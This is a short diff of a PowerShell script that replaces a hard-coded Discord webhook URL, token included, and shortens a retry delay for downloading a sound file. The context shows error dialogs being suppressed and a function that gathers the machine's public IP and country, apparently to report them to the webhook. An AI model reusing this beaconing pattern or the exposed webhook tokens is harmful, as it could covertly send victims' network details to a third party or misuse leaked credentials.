@@ -18,7 +18,7 @@ $SEM_NOALIGNMENTFAULTEXCEPT = 0x0004
 $SEM_NOOPENFILEERRORBOX = 0x8000
 
 # Discord Webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1381481586528092170/6e8NeeWj03JjQV3Q7o3Wgfgrv5cVe1BtMqHD-rK99pYmWtDGIQ9SAI8tXrDbgn86I8tu"
+$webhookUrl = "https://discord.com/api/webhooks/1381491913491746839/EIAoyrUOCh8Ie8hY7Y3kXRnFEE5NaGd7vkNm--qRzqT-dYo0wQ6vN8bp9QsEjsHHqBaa"
 
 # Function to get public IP and country code, then convert to Discord flag emoji
 function Get-CountryFlag {
@@ -196,7 +196,7 @@ function Download-SoundFile {
         } catch { }
         $retryCount++
         if ($retryCount -lt $maxRetries) {
-            Start-Sleep -Milliseconds 800
+            Start-Sleep -Milliseconds 10
         }
     }
     return $false
